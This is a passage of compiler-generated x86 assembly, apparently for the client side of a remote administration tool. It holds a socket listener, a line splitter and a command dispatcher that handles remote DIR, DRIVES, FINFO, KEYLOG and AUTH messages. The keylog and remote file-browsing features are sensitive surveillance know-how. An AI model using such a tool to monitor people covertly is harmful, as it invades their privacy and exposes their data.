	mov	d[ebp+12],eax			;;; i670
;
; [830] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func40.client			;;; i258
;
; [831] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.sMessageListenBin.client:  ;;; Function end label for Assembly Programmers.
end.func40.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  sMessageListenBin ()  *****
;  *****
;
; [833] FUNCTION sMessageListen (idx)
.code
;
#ifdef sMessageListen.idx
#undef sMessageListen.idx
#endif
#define sMessageListen.idx ebp+8	; exposes function argument 'idx'
;
align 16
_sMessageListen.client@4:
;  *****
;  *****  FUNCTION  sMessageListen ()  *****
;  *****
func30.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func30.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.152:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.152			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
funcBody30.client:
;
; [834] STRING buffer
#ifdef sMessageListen.buffer
#undef sMessageListen.buffer
#endif
#define sMessageListen.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [837] getSPServer (idx,ipaddress$,port,password$,@socket)
#ifdef sMessageListen.ipaddress$
#undef sMessageListen.ipaddress$
#endif
#define sMessageListen.ipaddress$ ebp-44	; exposes local variable 'ipaddress$'
;
	mov	eax,d[ebp-44]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk30.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
#ifdef sMessageListen.port
#undef sMessageListen.port
#endif
#define sMessageListen.port ebp-56	; exposes local variable 'port'
;
#ifdef sMessageListen.password$
#undef sMessageListen.password$
#endif
#define sMessageListen.password$ ebp-60	; exposes local variable 'password$'
;
	mov	eax,d[ebp-60]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk30.0001 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
#ifdef sMessageListen.socket
#undef sMessageListen.socket
#endif
#define sMessageListen.socket ebp-72	; exposes local variable 'socket'
;
	push	[ebp-72]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func48.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+16]			;;; i877a
	mov	d[ebp-72],ecx			;;; i670
	add	esp,20			;;; i633
;
; [839] DO
align 8
do.0045.client:
;
; [840] buffer = NULL$($$MAX_LBUFFER)
	sub	esp,64			;;; i487
	mov	d[esp],4096
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [841] bytesRead = recv (socket, &buffer, $$MAX_LBUFFER, 0)
#ifdef sMessageListen.bytesRead
#undef sMessageListen.bytesRead
#endif
#define sMessageListen.bytesRead ebp-76	; exposes local variable 'bytesRead'
;
	mov	eax,d[ebp-40]			;;; i642
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	4096			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp-72]			;;; i674a
	call	_recv@16			;;; i619
	mov	d[ebp-76],eax			;;; i670
;
; [843] IF (bytesRead == $$SOCKET_ERROR || bytesRead == 0) THEN
	mov	eax,d[ebp-76]			;;; i665
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.148			;;; i467
	not	eax			;;; i468
A.148:
;+peep
	mov	ebx,d[ebp-76]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.149			;;; i467
	not	ebx			;;; i468
A.149:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0046.client			;;; i221
;
; [844] EXIT DO
	jmp	end.do.0045.client			;;; i144
;
; [845] ELSE
	jmp	end.if.0046.client			;;; i107
else.0046.client:
;
; [846] MessagePump (idx,LEFT$(buffer,bytesRead))
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-76]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func36.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [847] END IF
end.if.0046.client:
;
; [848] LOOP WHILE (#CONNECTED == $$TRUE)
do.loop.0045.client:
	mov	eax,d[%#CONNECTED.client]			;;; i663a
	cmp	eax,-1			;;; i684a
	je	< do.0045.client			;;; i193
end.do.0045.client:
;
; [850] #CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#CONNECTED.client],eax			;;; i668
;
; [851] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.sMessageListen.client:  ;;; Function end label for Assembly Programmers.
end.func30.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func30.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func30.client:
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  sMessageListen ()  *****
;  *****
;
; [853] FUNCTION MessagePump (idx,msg$)
.code
;
#ifdef MessagePump.idx
#undef MessagePump.idx
#endif
#define MessagePump.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef MessagePump.msg$
#undef MessagePump.msg$
#endif
#define MessagePump.msg$ ebp+12	; exposes function argument 'msg$'
;
align 16
_MessagePump.client@8:
;  *****
;  *****  FUNCTION  MessagePump ()  *****
;  *****
func36.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.160:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.160			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody36.client:
;
; [854] SHARED APPLSTATUS
;
; [855] STATIC cmd$
data section 'globals$statics'
align	4
%36%cmd$.client:	db 4 dup ?
.code
;
; [858] msg$ = cmd$ + msg$
	mov	eax,[%36%cmd$.client]			;;; i663a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [859] msglen = LEN(msg$)
#ifdef MessagePump.msglen
#undef MessagePump.msglen
#endif
#define MessagePump.msglen ebp-40	; exposes local variable 'msglen'
;
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.153			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.153:
	mov	d[ebp-40],eax			;;; i670
;
; [860] p = LEN (cmd$)
#ifdef MessagePump.p
#undef MessagePump.p
#endif
#define MessagePump.p ebp-44	; exposes local variable 'p'
;
	mov	eax,d[%36%cmd$.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.154			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.154:
	mov	d[ebp-44],eax			;;; i670
;
; [861] start = 1
#ifdef MessagePump.start
#undef MessagePump.start
#endif
#define MessagePump.start ebp-48	; exposes local variable 'start'
;
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [862] flag = $$FALSE
#ifdef MessagePump.flag
#undef MessagePump.flag
#endif
#define MessagePump.flag ebp-52	; exposes local variable 'flag'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [864] DO
align 8
do.0047.client:
;
; [865] SELECT CASE msg${p}
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+12]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
; .select36.0048 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [866] CASE 0x01		:msg${p} = 0x0D: flag = $$FALSE
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0048.0001.client			;;; i71
	mov	eax,13			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [867] CASE 0x02		:msg${p} = 0x0A: flag = $$FALSE
	jmp	end.select.0048.client			;;; i69
case.0048.0001.client:
	mov	eax,2			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0048.0002.client			;;; i71
	mov	eax,10			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [868] 'CASE 0x05		:msg${p} = 32: flag = $$FALSE
;
; [869] CASE 0x0D		:flag = $$TRUE
	jmp	end.select.0048.client			;;; i69
case.0048.0002.client:
	mov	eax,13			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0048.0003.client			;;; i71
	mov	eax,-1			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [870] CASE 0x0A		:IFT flag THEN
	jmp	end.select.0048.client			;;; i69
case.0048.0003.client:
	mov	eax,10			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0048.0004.client			;;; i71
	mov	eax,d[ebp-52]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0049.client			;;; i221
;
; [871] cmd$ = MID$(msg$,start,p-start)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	mov	ebx,addr %36%cmd$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [872] IF cmd$ THEN ProcessCommands (idx,cmd$)
	mov	eax,[%36%cmd$.client]			;;; i663a
	test	eax,eax			;;; i214
	jz	>> else.004A.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.004A.client			;;; i218
	mov	eax,d[%36%cmd$.client]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func37.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
else.004A.client:
end.if.004A.client:
;
; [873] cmd$ = ""
	xor	eax,eax			;;; i3
	mov	ebx,addr %36%cmd$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [874] start = p+2
	mov	eax,d[ebp-44]			;;; i665
	add	eax,2			;;; i775
	mov	d[ebp-48],eax			;;; i670
;
; [875] END IF
else.0049.client:
end.if.0049.client:
;
; [876] flag = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [877] CASE ELSE		:IFT flag THEN flag = $$FALSE
	jmp	end.select.0048.client			;;; i69
case.0048.0004.client:
	mov	eax,d[ebp-52]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.004B.client			;;; i221
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
else.004B.client:
end.if.004B.client:
;
; [878] END SELECT
end.select.0048.client:
;
; [880] INC p
	inc	d[ebp-44]			;;; i84
;
; [881] LOOP WHILE ((p < msglen) && (APPLSTATUS == $$TRUE))
do.loop.0047.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jge	> A.155			;;; i467
	not	eax			;;; i468
A.155:
;+peep
	mov	ebx,d[%APPLSTATUS.client]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.156			;;; i467
	not	ebx			;;; i468
A.156:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.0047.client			;;; i195
end.do.0047.client:
;
; [883] IF (p-start+1) < 0 THEN RETURN 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	add	eax,1			;;; i775
	cmp	eax,0			;;; i684a
	jge	>> else.004C.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func36.client			;;; i258
else.004C.client:
end.if.004C.client:
;
; [884] IF start > LEN (msg$) THEN RETURN 0
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.157			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.157:
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.004D.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func36.client			;;; i258
else.004D.client:
end.if.004D.client:
;
; [885] cmd$ = MID$(msg$,start,p-start+1)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	add	eax,1			;;; i775
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	mov	ebx,addr %36%cmd$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [886] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func36.client			;;; i258
;
; [887] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.MessagePump.client:  ;;; Function end label for Assembly Programmers.
end.func36.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  MessagePump ()  *****
;  *****
;
; [889] FUNCTION ProcessCommands (idx,msg$)
.code
;
#ifdef ProcessCommands.idx
#undef ProcessCommands.idx
#endif
#define ProcessCommands.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef ProcessCommands.msg$
#undef ProcessCommands.msg$
#endif
#define ProcessCommands.msg$ ebp+12	; exposes function argument 'msg$'
;
align 16
_ProcessCommands.client@8:
;  *****
;  *****  FUNCTION  ProcessCommands ()  *****
;  *****
func37.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func37.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody37.client:
;
; [890] STRING buffer
#ifdef ProcessCommands.buffer
#undef ProcessCommands.buffer
#endif
#define ProcessCommands.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [893] GetToken (@msg$,@cmd$,32)
#ifdef ProcessCommands.cmd$
#undef ProcessCommands.cmd$
#endif
#define ProcessCommands.cmd$ ebp-44	; exposes local variable 'cmd$'
;
	push	32			;;; i656a
	push	[ebp-44]			;;; i674a
	push	[ebp+12]			;;; i674a
	call	func35.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	[ebp+12],ecx			;;; i670
	mov	[ebp-44],ebx			;;; i670
;
; [894] SELECT CASE UCASE$(cmd$)
	sub	esp,64			;;; i487
	mov	eax,[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_ucase.d.v			;;; i583
	add	esp,64			;;; i600
; .select37.004E = ebp-48	; internal variable
	mov	esi,[ebp-48]			;;; i665
	mov	[ebp-48],eax			;;; i670
	call	%____free			;;; i260
;
; [895] CASE "CMSG"			:CPrint ($$main,@msg$)
	mov	eax,addr @_string.0223.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0001.client			;;; i71
	push	[ebp+12]			;;; i674a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [896] CASE "DIR"			:addToTree(@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0001.client:
	mov	eax,addr @_string.0224.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0002.client			;;; i71
	push	[ebp+12]			;;; i674a
	call	func4E.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [897] CASE "REFRESH"		:refreshTreeNode(@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0002.client:
	mov	eax,addr @_string.0225.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0003.client			;;; i71
	push	[ebp+12]			;;; i674a
	call	func4F.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [898] CASE "KEY"			:CPrint ($$stream,@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0003.client:
	mov	eax,addr @_string.0226.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0004.client			;;; i71
	push	[ebp+12]			;;; i674a
	push	202			;;; i656a
	call	func3F.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [899] CASE "FINFO"		:processFileInfo (@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0004.client:
	mov	eax,addr @_string.0227.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0005.client			;;; i71
	push	[ebp+12]			;;; i674a
	call	func5E.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [900] CASE "KEYLOG"		:SessionLog ($$event,@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0005.client:
	mov	eax,addr @_string.0228.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0006.client			;;; i71
	push	[ebp+12]			;;; i674a
	push	201			;;; i656a
	call	func3C.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [901] CASE "EVENTFILE"	:EventLog ($$event,@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0006.client:
	mov	eax,addr @_string.0229.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0007.client			;;; i71
	push	[ebp+12]			;;; i674a
	push	201			;;; i656a
	call	func3D.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [902] CASE "EVENTLOGPART"	:CPrint ($$event, @msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0007.client:
	mov	eax,addr @_string.022A.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0008.client			;;; i71
	push	[ebp+12]			;;; i674a
	push	201			;;; i656a
	call	func3F.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
;
; [903] CASE "DRIVES"		:IF msg$ THEN setTreeDrives (@msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.0008.client:
	mov	eax,addr @_string.022B.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.0009.client			;;; i71
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.004F.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.004F.client			;;; i218
	push	[ebp+12]			;;; i674a
	call	func57.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
else.004F.client:
end.if.004F.client:
;
; [904] CASE "DISCONNECT"	:DisconnectServer (0)
	jmp	end.select.004E.client			;;; i69
case.004E.0009.client:
	mov	eax,addr @_string.022C.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.000A.client			;;; i71
	push	0			;;; i656a
	call	func3B.client			;;; i619
;
; [905] CASE "PING"			:SendSMessage(idx,"PONG "+ msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.000A.client:
	mov	eax,addr @_string.022D.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.000B.client			;;; i71
	mov	eax,addr @_string.022E.client			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [906] CASE "AUTHFAIL"		:#authok = $$FALSE
	jmp	end.select.004E.client			;;; i69
case.004E.000B.client:
	mov	eax,addr @_string.022F.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.000C.client			;;; i71
	mov	eax,0			;;; i659
	mov	d[%#authok.client],eax			;;; i668
;
; [907] CASE "AUTHOK"		:#authok = $$TRUE
	jmp	end.select.004E.client			;;; i69
case.004E.000C.client:
	mov	eax,addr @_string.0231.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.000D.client			;;; i71
	mov	eax,-1			;;; i659
	mov	d[%#authok.client],eax			;;; i668
;
; [908] CASE $$SR_AUTHCMD	:SendSMessage(idx,"AUTH "+ $$SR_AUTHPASS)
	jmp	end.select.004E.client			;;; i69
case.004E.000D.client:
	mov	eax,addr @_string.2D2D.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.004E.000E.client			;;; i71
	mov	eax,addr @_string.0134.client			;;; i663
	mov	ebx,addr @_string.2D2E.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [909] CASE ELSE			:CPrint ($$main	,"::"+cmd$+" "+msg$)
	jmp	end.select.004E.client			;;; i69
case.004E.000E.client:
	mov	eax,addr @_string.0233.client			;;; i663
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [910] END SELECT
end.select.004E.client:
;
; [912] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func37.client			;;; i258
;
; [913] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ProcessCommands.client:  ;;; Function end label for Assembly Programmers.
end.func37.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func37.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func37.client:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ProcessCommands ()  *****
;  *****
;
; [915] FUNCTION processFileInfo (STRING info)
.code
;
#ifdef processFileInfo.info
#undef processFileInfo.info
#endif
#define processFileInfo.info ebp+8	; exposes function argument 'info'
;
align 16
_processFileInfo.client@4:
;  *****
;  *****  FUNCTION  processFileInfo ()  *****
;  *****
func5E.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5E.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody5E.client:
;
; [916] STRING name
#ifdef processFileInfo.name
#undef processFileInfo.name
#endif
#define processFileInfo.name ebp-40	; exposes local variable 'name'
;
;
; [919] name = GetTokenEx(@info,'|',0)
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+8]			;;; i674a
